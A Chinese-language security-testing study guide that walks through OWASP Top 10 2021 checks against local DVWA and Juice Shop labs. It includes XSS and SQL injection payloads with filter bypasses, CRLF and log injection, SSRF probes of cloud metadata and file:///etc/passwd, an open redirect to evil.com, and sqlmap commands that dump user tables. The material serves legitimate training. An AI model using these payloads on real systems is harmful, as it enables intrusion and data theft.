# Phase 7 学习指南: OWASP Top 10 2021 完整覆盖

## 学习目标

通过本阶段学习完成 OWASP Top 10 2021 的完整覆盖，掌握：
- A02: 加密失败检测
- A06: 易受攻击组件识别
- A08: 软件完整性验证
- A09: 日志和监控失败检测
- A10: SSRF 漏洞测试
- 多安全级别测试
- SQLMap 自动化注入

---

## 1. 环境准备

### 启动测试环境

```bash
cd /Users/michaelzhou/Documents/github/michael-zhou-qa-portfolio/security-testing-demo

# 启动 Docker 环境
docker compose -f docker/docker-compose.yml up -d

# 验证服务
curl -I http://localhost        # DVWA
curl -I http://localhost:3000   # Juice Shop

# 安装依赖
pip install -r requirements.txt
```

### 安装额外工具

```bash
# SQLMap (SQL 注入自动化)
brew install sqlmap

# Safety (Python 依赖检查)
pip install safety

# Trivy (容器扫描，可选)
brew install trivy
```

---

## 2. A02: 加密失败测试 (test_crypto.py)

### 学习要点

| 漏洞类型 | 描述 | 风险 |
|----------|------|------|
| 弱 TLS 配置 | 使用过时的 SSL/TLS 版本 | 中间人攻击 |
| 敏感数据明文传输 | 密码在 URL 或日志中 | 数据泄露 |
| 弱会话令牌 | 可预测的 Session ID | 会话劫持 |
| 缺少安全 Cookie 标志 | 无 Secure/HttpOnly | Cookie 窃取 |

### 手动验证练习

#### 练习 1: 检查 HTTPS 配置

```bash
# 检查是否支持 HTTPS
curl -I https://localhost 2>&1 | head -5

# 检查 HTTP 到 HTTPS 重定向
curl -I http://localhost -L 2>&1 | grep -i "location"

# 检查 HSTS 头
curl -sI http://localhost | grep -i "strict-transport"
```

#### 练习 2: 检查敏感数据暴露

```bash
# 检查登录表单方法 (应为 POST)
curl -s http://localhost/login.php | grep -i "method="

# 检查响应中是否有敏感模式
curl -s http://localhost/login.php | grep -iE "password=|secret=|api_key="
```

#### 练习 3: 检查 Cookie 安全标志

```bash
# 检查 Set-Cookie 头
curl -sI http://localhost | grep -i "set-cookie"

# 应包含:
# - Secure (仅 HTTPS 发送)
# - HttpOnly (JavaScript 无法访问)
# - SameSite (CSRF 保护)
```

### 运行测试

```bash
pytest tests/test_crypto.py -v
```

---

## 3. A06: 易受攻击组件测试 (test_components.py)

### 学习要点

| 检查项 | 工具 | 说明 |
|--------|------|------|
| Python 依赖漏洞 | safety | 检查 requirements.txt |
| 服务器版本泄露 | curl | Server/X-Powered-By 头 |
| 前端库版本 | 手动 | jQuery/Bootstrap 版本 |
| Docker 镜像漏洞 | trivy | 扫描基础镜像 |

### 手动验证练习

#### 练习 1: Python 依赖检查

```bash
# 使用 safety 检查漏洞
pip install safety
safety check

# 或使用 pip-audit
pip install pip-audit
pip-audit
```

#### 练习 2: 服务器版本泄露

```bash
# 检查 Server 头
curl -sI http://localhost | grep -i "server"

# 检查 X-Powered-By 头
curl -sI http://localhost | grep -i "x-powered-by"

# 不应暴露版本号，例如:
# Server: Apache/2.4.41 (Ubuntu)  ❌ 暴露版本
# Server: Apache                   ✅ 隐藏版本
```

#### 练习 3: 前端库版本检查

```bash
# 查找 jQuery 版本
curl -s http://localhost | grep -oE "jquery[.-]?[0-9]+\.[0-9]+\.[0-9]+"

# 查找 Bootstrap 版本
curl -s http://localhost | grep -oE "bootstrap[.-]?[0-9]+\.[0-9]+\.[0-9]+"

# jQuery < 3.5.0 有 XSS 漏洞
# Bootstrap < 4.3.1 有 XSS 漏洞
```

#### 练习 4: Docker 镜像扫描

```bash
# 使用 Trivy 扫描 DVWA 镜像
trivy image vulnerables/web-dvwa

# 扫描 Juice Shop 镜像
trivy image bkimminich/juice-shop
```

### 运行测试

```bash
pytest tests/test_components.py -v
```

---

## 4. A08: 软件完整性测试 (test_integrity.py)

### 学习要点

| 检查项 | 描述 | 防护措施 |
|--------|------|----------|
| 不安全反序列化 | 恶意对象注入 | 输入验证 |
| CI/CD 安全 | 工作流权限过大 | 最小权限原则 |
| SRI (子资源完整性) | 外部脚本篡改 | integrity 属性 |
| 依赖锁定 | 依赖版本漂移 | lock 文件 |

### 手动验证练习

#### 练习 1: 检查 JSON 反序列化

```bash
# 发送包含原型污染的 JSON
curl -X POST http://localhost:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true}}'

# 检查服务器是否出错或接受恶意输入
```

#### 练习 2: GitHub Actions 安全检查

```bash
# 检查工作流权限
cat .github/workflows/security-scan.yml | grep -A5 "permissions:"

# 检查是否有硬编码的密钥
grep -rn "password=" .github/workflows/
grep -rn "api_key=" .github/workflows/
grep -rn "secret=" .github/workflows/

# 应使用 ${{ secrets.XXX }} 引用密钥
```

#### 练习 3: 子资源完整性 (SRI)

```bash
# 检查外部脚本是否有 integrity 属性
curl -s http://localhost | grep -E "<script.*src.*https?://" | head -3

# 安全示例:
# <script src="https://cdn.example.com/lib.js"
#         integrity="sha384-xxxx"
#         crossorigin="anonymous"></script>
```

#### 练习 4: 依赖版本锁定

```bash
# 检查 requirements.txt 是否有固定版本
cat requirements.txt | grep -E "^[a-z]" | head -10

# 应有版本号:
# requests==2.28.0  ✅
# requests          ❌
```

### 运行测试

```bash
pytest tests/test_integrity.py -v
```

---

## 5. A09: 日志和监控失败测试 (test_logging.py)

### 学习要点

| 漏洞类型 | 描述 | 影响 |
|----------|------|------|
| 日志注入 | 恶意数据写入日志 | 日志污染/伪造 |
| CRLF 注入 | 换行符注入 | HTTP 响应拆分 |
| 敏感数据记录 | 密码写入日志 | 数据泄露 |
| 缺少审计日志 | 无登录失败记录 | 攻击难以追踪 |

### 手动验证练习

#### 练习 1: 日志注入测试

```bash
# 通过 User-Agent 注入日志
curl http://localhost -H "User-Agent: Mozilla/5.0
Fake-Log-Entry: INJECTED"

# 通过用户名注入
curl -X POST http://localhost/login.php \
  -d "username=admin%0aFake-Entry: Success&password=test&Login=Login"

# 检查服务器日志是否被污染
docker compose -f docker/docker-compose.yml logs dvwa | tail -20
```

#### 练习 2: CRLF 注入测试

```bash
# 尝试注入 HTTP 头
curl "http://localhost?param=test%0d%0aX-Injected:%20true" -v 2>&1 | grep -i "x-injected"

# 尝试注入 Set-Cookie
curl "http://localhost?param=test%0d%0aSet-Cookie:%20injected=true" -v
```

#### 练习 3: 暴力破解检测

```bash
# 发送多次失败登录
for i in {1..10}; do
  curl -X POST http://localhost/login.php \
    -d "username=admin&password=wrong$i&Login=Login" \
    -w "Attempt $i: %{http_code}\n" -o /dev/null -s
  sleep 0.5
done

# 检查是否有:
# - 429 Too Many Requests
# - 账户锁定消息
# - 渐进式延迟
```

### 运行测试

```bash
pytest tests/test_logging.py -v
```

---

## 6. A10: SSRF 测试 (test_ssrf.py)

### 学习要点

| 攻击向量 | 描述 | 目标 |
|----------|------|------|
| 内部服务访问 | 访问 127.0.0.1/localhost | 内部 API |
| 云元数据 | 169.254.169.254 | AWS/GCP 凭证 |
| 协议走私 | file://, gopher:// | 读取文件 |
| IP 编码绕过 | 八进制/十六进制 IP | 绕过黑名单 |

### 手动验证练习

#### 练习 1: 云元数据端点

```bash
# AWS 元数据端点 (在 AWS 环境中测试)
curl http://169.254.169.254/latest/meta-data/

# GCP 元数据端点
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# 如果应用有 URL 获取功能，尝试这些端点
```

#### 练习 2: IP 编码绕过

```bash
# 127.0.0.1 的不同表示方式
echo "标准: 127.0.0.1"
echo "十进制: 2130706433"
echo "八进制: 0177.0.0.1"
echo "十六进制: 0x7f.0x0.0x0.0x1"
echo "IPv6: [::1]"
echo "缩写: 127.1"

# 在 URL 获取功能中测试这些变体
# http://2130706433/admin
# http://0x7f.0x0.0x0.0x1/admin
```

#### 练习 3: 协议走私

```bash
# file:// 协议 (读取本地文件)
# 如果应用接受 URL 参数，尝试:
# ?url=file:///etc/passwd

# gopher:// 协议 (发送任意 TCP 数据)
# ?url=gopher://127.0.0.1:6379/_PING

# dict:// 协议 (获取服务信息)
# ?url=dict://127.0.0.1:6379/INFO
```

#### 练习 4: Juice Shop 重定向测试

```bash
# 测试开放重定向
curl -I "http://localhost:3000/redirect?to=http://evil.com" 2>&1 | grep -i location

# 测试内部重定向
curl -I "http://localhost:3000/redirect?to=http://127.0.0.1" 2>&1 | grep -i location
```

### 运行测试

```bash
pytest tests/test_ssrf.py -v
```

---

## 7. 多安全级别测试 (test_multi_level.py)

### 学习要点

| 级别 | XSS 防护 | SQLi 防护 | CSRF 防护 |
|------|----------|-----------|-----------|
| Low | 无 | 无 | 无 Token |
| Medium | 简单过滤 | 引号转义 | 弱 Token |
| High | 强过滤 | 参数化查询 | 强 Token |

### 手动验证练习

#### 练习 1: 设置安全级别

```bash
# 获取 Session Cookie
COOKIE=$(curl -c - http://localhost/login.php 2>/dev/null | grep PHPSESSID | awk '{print $7}')

# 登录
curl -b "PHPSESSID=$COOKIE" -c - \
  -X POST http://localhost/login.php \
  -d "username=admin&password=password&Login=Login"

# 设置安全级别为 Low
curl -b "PHPSESSID=$COOKIE" \
  -X POST http://localhost/security.php \
  -d "security=low&seclev_submit=Submit"

# 设置为 Medium
curl -b "PHPSESSID=$COOKIE" \
  -X POST http://localhost/security.php \
  -d "security=medium&seclev_submit=Submit"

# 设置为 High
curl -b "PHPSESSID=$COOKIE" \
  -X POST http://localhost/security.php \
  -d "security=high&seclev_submit=Submit"
```

#### 练习 2: XSS 在不同级别

```bash
# Low: 基础 payload 有效
curl -b "PHPSESSID=$COOKIE;security=low" \
  "http://localhost/vulnerabilities/xss_r/?name=<script>alert(1)</script>"

# Medium: 需要大小写绕过
curl -b "PHPSESSID=$COOKIE;security=medium" \
  "http://localhost/vulnerabilities/xss_r/?name=<ScRiPt>alert(1)</ScRiPt>"

# High: 需要事件处理器
curl -b "PHPSESSID=$COOKIE;security=high" \
  "http://localhost/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>"
```

#### 练习 3: SQLi 在不同级别

```bash
# Low: 基础注入
curl -b "PHPSESSID=$COOKIE;security=low" \
  "http://localhost/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"

# Medium: 数字注入 (无引号)
curl -b "PHPSESSID=$COOKIE;security=medium" \
  "http://localhost/vulnerabilities/sqli/?id=1+OR+1=1&Submit=Submit"

# High: 大多数注入被阻止
curl -b "PHPSESSID=$COOKIE;security=high" \
  "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit"
```

### 运行测试

```bash
# 运行所有多级别测试
pytest tests/test_multi_level.py -v

# 生成漏洞矩阵
pytest tests/test_multi_level.py::TestSecurityLevelComparison -v -s
```

---

## 8. SQLMap 集成测试 (test_sqlmap.py)

### 学习要点

| 参数 | 说明 | 示例 |
|------|------|------|
| -u | 目标 URL | -u "http://localhost/?id=1" |
| --cookie | Cookie | --cookie "PHPSESSID=xxx" |
| --batch | 非交互模式 | --batch |
| --dbs | 列出数据库 | --dbs |
| --tables | 列出表 | -D dvwa --tables |
| --dump | 导出数据 | -D dvwa -T users --dump |

### 手动验证练习

#### 练习 1: 检查 SQLMap 安装

```bash
# 检查版本
sqlmap --version

# 查看帮助
sqlmap -h
```

#### 练习 2: 基础检测

```bash
# 获取 DVWA Session
# 首先手动登录 DVWA 并获取 PHPSESSID

# 运行基础检测
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --batch \
  --level=1 \
  --risk=1
```

#### 练习 3: 枚举数据库

```bash
# 列出所有数据库
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --batch \
  --dbs
```

#### 练习 4: 导出数据

```bash
# 导出 users 表
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --batch \
  -D dvwa \
  -T users \
  --dump
```

### 运行测试

```bash
pytest tests/test_sqlmap.py -v
```

---

## 9. 运行所有 Phase 7 测试

```bash
# 运行所有新增测试
pytest tests/test_crypto.py tests/test_components.py \
  tests/test_integrity.py tests/test_logging.py \
  tests/test_ssrf.py tests/test_multi_level.py \
  tests/test_sqlmap.py -v

# 按 OWASP 标记运行
pytest -m crypto -v      # A02
pytest -m components -v  # A06
pytest -m integrity -v   # A08
pytest -m logging -v     # A09
pytest -m ssrf -v        # A10
pytest -m multi_level -v # 多级别
pytest -m sqlmap -v      # SQLMap

# 生成 HTML 报告
pytest tests/test_crypto.py tests/test_components.py \
  tests/test_integrity.py tests/test_logging.py \
  tests/test_ssrf.py -v --html=reports/phase7-report.html
```

---

## 10. 学习检查清单

### 知识掌握

- [ ] 理解 OWASP Top 10 2021 所有类别
- [ ] 理解加密失败的常见问题
- [ ] 理解依赖漏洞检测方法
- [ ] 理解软件完整性验证
- [ ] 理解日志注入攻击
- [ ] 理解 SSRF 攻击向量

### 实操技能

- [ ] 能检测 TLS/Cookie 安全配置
- [ ] 能使用 safety/trivy 扫描漏洞
- [ ] 能检测 SRI 和 CI/CD 安全问题
- [ ] 能测试日志注入和 CRLF
- [ ] 能识别 SSRF 攻击面
- [ ] 能在不同安全级别测试漏洞
- [ ] 能使用 SQLMap 进行自动化注入

### 工具使用

- [ ] 熟练使用 curl 进行安全测试
- [ ] 熟练使用 safety 检查依赖
- [ ] 熟练使用 sqlmap 进行 SQL 注入
- [ ] 熟练使用 pytest 运行安全测试

---

## 11. OWASP Top 10 2021 完整覆盖总结

| ID | 名称 | 测试文件 | 测试数 |
|----|------|----------|--------|
| A01 | Broken Access Control | test_auth.py, test_csrf.py | 10 |
| A02 | Cryptographic Failures | test_crypto.py | 10 |
| A03 | Injection | test_xss.py, test_sqli.py, test_sqlmap.py | 17 |
| A04 | Insecure Design | test_business_logic.py | 8 |
| A05 | Security Misconfiguration | test_headers.py | 5 |
| A06 | Vulnerable Components | test_components.py | 10 |
| A07 | Identification Failures | test_auth.py, test_jwt.py | 12 |
| A08 | Software Integrity | test_integrity.py | 10 |
| A09 | Logging Failures | test_logging.py | 10 |
| A10 | SSRF | test_ssrf.py | 12 |
| - | Multi-Level Tests | test_multi_level.py | 8 |
| - | Scanner Integration | test_zap.py, test_nessus.py, test_openvas.py | 48 |
| **Total** | | | **170** |

---

## 12. 常见问题

### Q: SQLMap 运行超时怎么办？

```bash
# 增加超时时间
sqlmap -u "URL" --timeout=30 --retries=3

# 使用更快的技术
sqlmap -u "URL" --technique=BEU  # 仅 Boolean, Error, Union
```

### Q: Safety 报告误报怎么办？

```bash
# 忽略特定漏洞
safety check --ignore=12345

# 使用 JSON 输出分析
safety check --json > safety-report.json
```

### Q: 如何验证 SSRF 漏洞？

```bash
# 使用 Burp Collaborator 或类似服务
# 1. 获取唯一的 Collaborator URL
# 2. 在 SSRF 测试中使用该 URL
# 3. 检查 Collaborator 是否收到请求
```

### Q: 多级别测试如何切换？

```python
# 在 pytest 中使用 fixture
def test_xss(set_security_level, dvwa_session):
    set_security_level("medium")
    # 测试代码...
```
